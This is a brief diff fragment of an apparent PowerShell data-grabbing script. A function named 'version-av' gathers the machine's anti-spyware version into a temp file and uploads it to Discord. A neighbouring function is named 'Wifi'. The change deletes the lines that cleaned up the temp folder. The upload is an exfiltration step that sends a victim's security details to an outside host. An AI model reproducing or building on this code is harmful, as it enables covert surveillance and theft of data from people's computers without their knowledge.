@@ -56,9 +56,6 @@ function version-av {
     # Upload AntiSpyware.txt to Discord
     Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
 
-    # Return to C:\temp folder
-    cd C:\
-    rmdir -R \temp
 }
 
 function Wifi {
